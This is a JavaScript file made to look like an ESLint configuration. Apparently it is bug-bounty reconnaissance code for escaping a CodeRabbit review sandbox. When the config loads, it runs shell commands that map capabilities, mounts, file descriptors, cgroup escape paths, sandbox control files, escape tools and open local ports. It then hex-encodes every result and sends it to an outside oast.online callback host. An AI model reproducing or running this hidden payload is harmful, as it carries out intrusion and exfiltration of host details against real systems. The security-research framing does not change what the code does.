// CodeRabbit RCE — SANDBOX ESCAPE surface recon (triager-authorized escalation).
// Enumerates caps/seccomp, mounts, leaked FDs, the sandboxer control plane,
// localhost services, and container-vs-microVM signals. Recon only (no break-out yet).
var C = 'd8sf2droeaqm1aamaat07caye8m7w4zmf.oast.online';
var http = require('http'), dns = require('dns'), cp = require('child_process'), net = require('net'), fs = require('fs');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive5.' + C, function () {}); } catch (e) {}
var shA = function (c, t) { try { cp.exec(c, { timeout: 8000 }, function (e, o, s) { httpX(t, (o || '') + (s || '') + (e ? '|ERR:' + e.code : '')); }); } catch (x) {} };

// (1) privilege model: caps / seccomp / NoNewPrivs / userns mapping
shA('grep -E "^(Cap|NoNewPrivs|Seccomp|Uid|Gid|Groups)" /proc/self/status', 'status');
shA('echo uid_map:; cat /proc/self/uid_map 2>/dev/null; echo gid_map:; cat /proc/self/gid_map 2>/dev/null', 'uidmap');
// (2) mounts — writable host paths, docker.sock, cgroup rw, proc/sys
shA('cat /proc/mounts 2>/dev/null | grep -vE "^(proc|sysfs|tmpfs|devpts|mqueue|cgroup) " | head -40', 'mounts');
shA('grep -iE "docker|containerd|crio|host|overlay|cgroup" /proc/mounts 2>/dev/null | head -25', 'mounts2');
// (3) leaked file descriptors (inherited host handles)
shA('ls -la /proc/self/fd 2>/dev/null; echo ---DEV---; ls -la /dev 2>/dev/null | head -40', 'fds');
// (4) cgroup escape surface (release_agent / writability)
shA('ls -la /sys/fs/cgroup 2>/dev/null | head; find /sys/fs/cgroup -maxdepth 2 -name release_agent 2>/dev/null; awk "{print \\$2}" /proc/self/mountinfo 2>/dev/null | grep cgroup | head', 'cgesc');
// (5) container-vs-microVM signals
shA('cat /proc/cmdline 2>/dev/null; echo ---; for f in product_name sys_vendor board_name; do echo "$f=$(cat /sys/class/dmi/id/$f 2>/dev/null)"; done; grep -m1 -i hypervisor /proc/cpuinfo; cat /sys/class/net/*/address 2>/dev/null', 'platform');
// (6) the sandboxer control plane + neighbour processes
shA('echo CMDRES:; cat /tmp/sandboxer-command-resource 2>/dev/null | head -c 300 | od -c | head -8; echo PROCS:; for p in /proc/[0-9]*; do echo "$(basename $p)=$(cat $p/comm 2>/dev/null)"; done 2>/dev/null | head -50', 'sandboxer');
shA('ls -la /tmp/codegraph-runner-* 2>/dev/null; find / -maxdepth 3 -iname "*sandbox*" -o -maxdepth 3 -iname "*codegraph*" 2>/dev/null | head -20', 'sbfiles');
// (7) escape tooling availability
shA('for b in unshare nsenter mount setcap capsh runc docker ctr crictl gdb; do p=$(command -v $b 2>/dev/null); [ -n "$p" ] && echo "$b=$p"; done', 'tools');

// (8) localhost control-plane / debug ports (node --inspect=9229, docker 2375, etc.)
[1080, 2375, 2376, 9229, 9230, 8080, 8000, 3000, 5000, 9000, 6060, 1234, 4000, 6379, 5432, 50051, 8888].forEach(function (p) {
  try { var s = net.connect({ host: '127.0.0.1', port: p, timeout: 1800 }, function () { httpX('port', p + ':OPEN'); try { s.destroy(); } catch (e) {} }); s.on('error', function () {}); s.on('timeout', function () { try { s.destroy(); } catch (e) {} }); } catch (e) {}
});

module.exports = { root: true, rules: {} };
